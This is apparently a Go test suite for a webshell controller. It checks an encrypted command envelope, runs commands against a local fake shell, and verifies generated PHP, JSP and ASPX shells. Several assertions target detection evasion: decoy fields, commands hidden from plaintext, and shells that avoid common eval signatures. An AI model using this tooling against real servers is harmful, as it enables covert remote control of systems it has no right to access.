package webshell

import (
	"context"
	"encoding/base64"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

func TestArtexCryptEnvelope(t *testing.T) {
	const secret = "envelope-secret"
	plain := []byte("whoami")

	env, err := artexCryptSeal(secret, plain)
	if err != nil {
		t.Fatal(err)
	}
	if strings.ContainsAny(env, "=+/") {
		t.Fatalf("envelope should be unpadded base64url: %q", env)
	}
	got, err := artexCryptOpen(secret, env)
	if err != nil || string(got) != string(plain) {
		t.Fatalf("round trip = %q err=%v", got, err)
	}

	// 同一个明文两次加密必须不同（随机 IV）。
	env2, _ := artexCryptSeal(secret, plain)
	if env == env2 {
		t.Fatal("random IV should make every envelope unique")
	}
	if _, err := artexCryptOpen("wrong-secret", env); err == nil {
		t.Fatal("wrong secret must fail authentication")
	}

	// 篡改密文或 tag 都应在 HMAC 校验处失败。
	raw, _ := base64.RawURLEncoding.DecodeString(env)
	raw[20] ^= 0xff
	if _, err := artexCryptOpen(secret, base64.RawURLEncoding.EncodeToString(raw)); err == nil {
		t.Fatal("tampered ciphertext must be rejected")
	}
	raw, _ = base64.RawURLEncoding.DecodeString(env)
	raw[len(raw)-1] ^= 0xff
	if _, err := artexCryptOpen(secret, base64.RawURLEncoding.EncodeToString(raw)); err == nil {
		t.Fatal("tampered tag must be rejected")
	}

	// 大正文走 gzip 分支，解出来必须完全一致。
	big := []byte(strings.Repeat("artex-", 2000))
	env, err = artexCryptSeal(secret, big)
	if err != nil {
		t.Fatal(err)
	}
	if len(env) > len(big) {
		t.Fatalf("compressible payload should shrink: %d > %d", len(env), len(big))
	}
	got, err = artexCryptOpen(secret, env)
	if err != nil || len(got) != len(big) || string(got) != string(big) {
		t.Fatalf("gzip round trip failed: %d bytes err=%v", len(got), err)
	}
}

func TestArtexCryptExecAgainstFakeShell(t *testing.T) {
	const secret = "s3cret"
	var bodies []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		bodies = append(bodies, string(body))
		form, _ := url.ParseQuery(string(body))
		enc := form.Get("d")
		if enc == "" {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		pkg, err := artexCryptOpen(secret, enc)
		if err != nil {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		parts := strings.SplitN(string(pkg), "\n", 3)
		if len(parts) != 3 {
			w.WriteHeader(http.StatusBadRequest)
			return
		}
		out := "echo[" + parts[2] + "]"
		if parts[2] == ProbeCommand {
			out = "artex_probe_ok"
		}
		resp, err := artexCryptSeal(secret, []byte(parts[0]+out+parts[1]))
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			return
		}
		_, _ = io.WriteString(w, resp)
	}))
	defer srv.Close()

	target := &Target{URL: srv.URL, Type: TypeArtexCryptPHP, Secret: secret, InsecureTLS: true}
	out, err := Exec(context.Background(), target, "whoami", DefaultTimeout)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !out.Parsed || out.Output != "echo[whoami]" {
		t.Fatalf("unexpected outcome: %+v", out)
	}
	alive, msg, err := Check(context.Background(), target, DefaultTimeout)
	if err != nil || !alive {
		t.Fatalf("Check: alive=%v msg=%q err=%v", alive, msg, err)
	}

	// 请求体应至少带 3 个字段（真字段 + 2 个诱饵），且命令本身不以明文出现。
	form, _ := url.ParseQuery(bodies[0])
	if len(form) < 3 {
		t.Fatalf("expected decoy fields, got %d", len(form))
	}
	if strings.Contains(bodies[0], "whoami") || strings.Contains(bodies[0], ProbeCommand) {
		t.Fatalf("command leaked in plaintext: %s", bodies[0])
	}
	// 同一条命令两次请求的密文必须不同。
	form2, _ := url.ParseQuery(bodies[1])
	if form.Get("d") == form2.Get("d") {
		t.Fatal("same command produced identical ciphertext")
	}
}

func TestArtexCryptGeneratedShells(t *testing.T) {
	const secret = "s3cret"
	encKey, macKey := artexCryptKeys(secret)
	ke := base64.StdEncoding.EncodeToString(encKey)
	km := base64.StdEncoding.EncodeToString(macKey)

	cases := []struct {
		name     string
		typ      string
		contains []string
	}{
		{"php", TypeArtexCryptPHP, []string{ke, km, `$f = "q"`, "hash_hmac", "AES-256-CBC", "gzencode", "gzdecode", "artex_eq"}},
		{"jsp", TypeArtexCryptJSP, []string{ke, km, `static final String F = "q"`, "HmacSHA256", "AES/CBC/PKCS5Padding", "GZIPInputStream", "Base64.getUrlDecoder"}},
		{"aspx", TypeArtexCryptASPX, []string{ke, km, `static readonly string F = "q"`, "HMACSHA256", "CipherMode.CBC", "GZipStream", "Request.Form[F]"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, code, err := Payload(&Target{Type: tc.typ, Param: "q", Secret: secret})
			if err != nil {
				t.Fatalf("Payload: %v", err)
			}
			for _, want := range tc.contains {
				if !strings.Contains(code, want) {
					t.Fatalf("%s shell missing %q", tc.name, want)
				}
			}
			if strings.Contains(code, secret) {
				t.Fatal("generated shell should embed derived keys, not the secret itself")
			}
			if strings.Contains(code, "eval(") || strings.Contains(code, "base64_decode($_POST") {
				t.Fatal("self-developed shell must not eval request data")
			}
		})
	}
}
